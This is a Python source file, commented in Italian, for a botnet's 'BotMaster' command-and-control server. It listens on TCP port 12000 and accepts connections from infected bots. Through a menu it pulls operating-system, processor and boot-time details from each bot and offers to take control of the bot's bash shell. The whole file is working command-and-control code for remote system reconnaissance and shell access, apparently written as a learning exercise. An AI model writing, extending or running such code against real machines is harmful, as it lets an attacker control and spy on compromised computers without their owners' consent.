from socket import *
serverPort = 12000
serverSocket = socket(AF_INET,SOCK_STREAM)
serverName = gethostbyname(gethostname())
serverSocket.bind(('',serverPort))
serverSocket.listen(1)
print('Il BotMaster con indirizzo IP:',serverName, 'è pronto a ricevere le informazioni dalla Botnet client...')

def invia_messaggio(messaggio):
    global connectionSocket
    try:
        connectionSocket.send(messaggio.encode())
    except Exception as e:
        #Il client si è disconnesso nel mentre, tentiamo la riconnessione a un bot ì
        print (str(e.errno))
        print(str(e))
        connectionSocket.close()
        connectionSocket, addr = serverSocket.accept()
        print ("Messaggio non inviato, bot master connesso ad un bot con indirizzo" + str(addr))


def ricevi_messaggio():
    global connectionSocket
    try:
        messaggio = connectionSocket.recv(4096).decode()
        print('Hai ricevuto:', messaggio)
    except Exception as e:
        #Il client si è disconnesso nel mentre, tentiamo la riconnessione a un bot
        print (str(e.errno))
        print(str(e))
        connectionSocket.close()
        connectionSocket, addr = serverSocket.accept()
        print ("Messaggio non ricevuto, bot master connesso ad un bot con indirizzo" + str(addr))

def menu():
    print("\nScegliere l'operazione da eseguire:\n"
          +"0: termina la connessione\n"
          +"1: ricevi informazioni sul sistema operativo\n"
          +"2: ricevi informazioni sul processore\n"
          +"3: ricevi informazioni sul tempo d'avvio\n"
          +"4: entra in controllo della bash\n")
    return input()
    
while True:
    connectionSocket, addr = serverSocket.accept()
    print('\nNuova Botnet client connessa al BotMaster', addr)
        
    while True:
        comando = menu()
        invia_messaggio(comando)
        if (comando != "0"):
            ricevi_messaggio()
        else:
            break

    connectionSocket.close()
    print("Precedente connessione terminata, BotMaster in attesa di un nuovo bot")

